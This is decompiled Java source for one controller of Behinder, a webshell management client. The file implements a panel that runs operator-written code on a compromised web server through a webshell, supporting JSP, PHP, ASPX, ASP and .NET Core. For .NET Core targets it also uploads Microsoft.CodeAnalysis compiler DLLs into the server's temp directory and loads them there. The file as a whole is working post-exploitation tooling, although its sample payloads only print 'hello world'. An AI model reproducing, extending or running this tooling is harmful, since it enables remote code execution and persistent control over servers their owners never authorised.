//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package net.rebeyond.behinder.ui.controller;

import java.util.List;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;

import javafx.application.Platform;
import javafx.fxml.FXML;
import javafx.scene.control.Button;
import javafx.scene.control.Label;
import javafx.scene.control.TextArea;
import javafx.scene.web.WebEngine;
import javafx.scene.web.WebView;
import net.rebeyond.behinder.core.IShellService;
import net.rebeyond.behinder.dao.ShellManager;
import net.rebeyond.behinder.utils.Utils;
import netscape.javascript.JSObject;
import org.json.JSONObject;

public class UserCodeViewController {
    private ShellManager shellManager;
    @FXML
    private TextArea sourceCodeTextArea;
    @FXML
    private TextArea sourceResultArea;
    @FXML
    private WebView sourceCodeWebview;
    @FXML
    private Button runCodeBtn;
    @FXML
    public Button uploadBtn;

    private IShellService currentShellService;
    private JSONObject shellEntity;
    private JSONObject effectShellEntity;
    private List<Thread> workList;
    private Label statusLabel;
    private JSObject editor;
    private int flag = 0;

    public UserCodeViewController() {
    }

	public void init(IShellService shellService, List<Thread> workList, Label statusLabel, ShellManager shellManager) {
        this.currentShellService = shellService;
        this.shellEntity = shellService.getShellEntity();
        this.effectShellEntity = shellService.getEffectShellEntity();
        this.workList = workList;
        this.statusLabel = statusLabel;
        this.shellManager = shellManager;
        try {
            this.initUserCodeView();
        } catch (Exception ex) {
            ex.printStackTrace();
        }

    }
	
    public void init(IShellService shellService, List<Thread> workList, Label statusLabel) {
        this.currentShellService = shellService;
        this.shellEntity = shellService.getShellEntity();
        this.effectShellEntity = shellService.getEffectShellEntity();
        this.workList = workList;
        this.statusLabel = statusLabel;

        try {
            this.initUserCodeView();
        } catch (Exception ex) {
            ex.printStackTrace();
        }

    }

    private void initUserCodeView() {
        String javaCodeDemo = "import javax.servlet.ServletOutputStream;\nimport javax.servlet.ServletRequest;\nimport javax.servlet.ServletResponse;\nimport javax.servlet.http.HttpSession;\nimport javax.servlet.jsp.PageContext;\nimport java.lang.reflect.Method;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class Test {\n\n    private Object Request;\n    private Object Response;\n    private Object Session;\n\n    @Override\n    public boolean equals(Object obj) {\n\n        try {\n            fillContext(obj);\n            ServletOutputStream so = ((ServletResponse) Response).getOutputStream();\n            so.write(\"hello world\".getBytes(\"UTF-8\"));\n            so.flush();\n            so.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return true;\n    }\n\n    private void fillContext(Object obj) throws Exception {\n        if (obj.getClass().getName().indexOf(\"PageContext\") >= 0) {\n            this.Request = obj.getClass().getDeclaredMethod(\"getRequest\", new Class[] {}).invoke(obj);\n            this.Response = obj.getClass().getDeclaredMethod(\"getResponse\", new Class[] {}).invoke(obj);\n            this.Session = obj.getClass().getDeclaredMethod(\"getSession\", new Class[] {}).invoke(obj);\n        } else {\n            Map<String, Object> objMap = (Map<String, Object>) obj;\n            this.Session = objMap.get(\"session\");\n            this.Response = objMap.get(\"response\");\n            this.Request = objMap.get(\"request\");\n        }\n        Response.getClass().getDeclaredMethod(\"setCharacterEncoding\", new Class[] { String.class }).invoke(Response,\n                \"UTF-8\");\n    }\n}";
        String phpCodeDemo = "echo \"hello world\";\n@session_start();\nvar_dump($_SESSION);";
        String aspxCodeDemo = "using System;\nusing System.Web;\nusing System.Web.SessionState;\nusing System.Web.UI;\n\n    public class Eval\n    {\n        public HttpRequest Request;\n        public HttpResponse Response;\n        public HttpSessionState Session;\n\t\n\tpublic void eval(object obj)\n\t{\n\t    init(obj);\n\t    Response.Write(\"hello world!\");\n\t}\n\tprivate void init(object obj)\n    {\n\t\tif (obj is HttpContext)\n\t\t{\n            HttpContext ctx = (HttpContext)obj;\n\t\t\tthis.Response = ctx.Response;\n\t\t}\n\t\telse\n\t\t{\n\t\t    Page ctx = (Page)obj;\n            this.Response = ctx.Response;\n\t\t}\n    }\n  }";
        String dotnetCoreDemo = "public class Eval\n" +
                "{\n" +
                "    public string eval()\n" +
                "    {\n" +
                "        return \"Hello from dynamic code!\";\n" +
                "    }\n" +
                "}\n" +
                "\n";
        String aspCodeDemo = "response.write(\"hello world\")";
        String currentType = this.effectShellEntity.getString("type");
        WebEngine webEngine = this.sourceCodeWebview.getEngine();
        webEngine.load(this.getClass().getResource("/net/rebeyond/behinder/resource/codeEditor/editor_" + currentType + ".html").toExternalForm());
        webEngine.documentProperty().addListener((observable, oldValue, newValue) -> {
            if (newValue != null) {
                this.editor = (JSObject)webEngine.executeScript("window.editor");
                switch (currentType) {
                    case "jsp":
                        this.editor.call("setValue", new Object[]{javaCodeDemo});
                        break;
                    case "php":
                        this.editor.call("setValue", new Object[]{"<?php\n" + phpCodeDemo + "\n?>"});
                        break;
                    case "aspx":
                        this.editor.call("setValue", new Object[]{aspxCodeDemo});
                        break;
                    case "dotnetCore":
                        this.uploadBtn.setVisible(true);
                        this.runCodeBtn.setDisable(true);
                        this.editor.call("setValue", new Object[]{dotnetCoreDemo});
                        break;
                    case "asp":
                        this.editor.call("setValue", new Object[]{aspCodeDemo});
                }

            }
        });
        this.runCodeBtn.setOnAction((event) -> {
            try {
                this.runSourceCode();
            } catch (Exception e) {
                e.printStackTrace();
            }

        });
        this.uploadBtn.setOnAction((event) -> {
            try {
                this.uploadAsyncTask();
            } catch (Exception e) {
                e.printStackTrace();
            }
        });
    }

    public void uploadAsyncTask() throws Exception {
        Runnable runner = () -> {
            try {
                this.uploadCodeAnalysis();

                Platform.runLater(() -> {
                    try {
                        if (this.flag == 2) {
                            this.runCodeBtn.setDisable(false);
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                        this.statusLabel.setText(e.getMessage());
                    }

                });
            } catch (Exception e) {
                e.printStackTrace();
                Platform.runLater(() -> {
                    Utils.showErrorMessage("错误", e.getMessage());
                    this.statusLabel.setText(e.getMessage());
                });
            }

        };
        Thread worker = new Thread(runner);
        this.workList.add(worker);
        worker.start();
    }

    private void uploadCodeAnalysis() throws Exception {
        String driverPath = "net/rebeyond/behinder/resource/driver/";
        String os = this.shellManager.findShell(this.effectShellEntity.getInt("id")).getString("os").toLowerCase();
        String remoteDir = os.indexOf("windows") >= 0 ? "c:/windows/temp/" : "/tmp/";
        String[] libNames = new String[]{"Microsoft.CodeAnalysis.CSharp.dll", "Microsoft.CodeAnalysis.dll"};
        for (String libName : libNames) {
            byte[] driverFileContent = Utils.getResourceData(driverPath + libName);
            String remotePath = remoteDir + libName;
            this.statusLabel.setText("正在上传" + libName + "......");
            this.currentShellService.uploadFile(remotePath, driverFileContent, true);
            Platform.runLater(() -> this.statusLabel.setText(".NET编译器上传成功，正在加载……"));
            JSONObject loadRes = this.currentShellService.loadJar(remotePath);
            if (loadRes.getString("status").equals("fail")) {
                this.statusLabel.setText(".NET编译器加载失败:" + loadRes.getString("msg"));
                throw new Exception(".NET编译器加载失败:" + loadRes.getString("msg"));
            } else {
                Platform.runLater(() -> {
                    this.statusLabel.setText(libName + "加载成功。");
                    this.flag += 1;
                });
            }
        }
    }

    private void runSourceCode() {
        this.statusLabel.setText("正在执行……");
        String sourceCode = this.editor.call("getValue", new Object[0]).toString();
        Runnable runner = () -> {
            try {
                String finalSourceCode = sourceCode.trim();
                if (this.effectShellEntity.getString("type").equals("php")) {
                    finalSourceCode = sourceCode.trim();
                    if (finalSourceCode.startsWith("<?php")) {
                        finalSourceCode = finalSourceCode.substring(5);
                    } else if (finalSourceCode.startsWith("<?")) {
                        finalSourceCode = finalSourceCode.substring(2);
                    }

                    if (finalSourceCode.endsWith("?>")) {
                        finalSourceCode = finalSourceCode.substring(0, finalSourceCode.length() - 2);
                    }
                }

                String result = this.currentShellService.eval(finalSourceCode);
                Platform.runLater(() -> {
                    this.sourceResultArea.setText(result);
                    this.statusLabel.setText("完成。");
                });
            } catch (Exception e) {
                e.printStackTrace();
                Platform.runLater(() -> {
                    this.statusLabel.setText("运行失败:" + e.getMessage());
                    this.sourceResultArea.setText(e.getMessage());
                });
            }

        };
        Thread workThrad = new Thread(runner);
        this.workList.add(workThrad);
        workThrad.start();
    }

    public class Native {
        public Native() {
        }

        public String getClipboardString() {
            return Utils.getClipboardString();
        }
    }
}
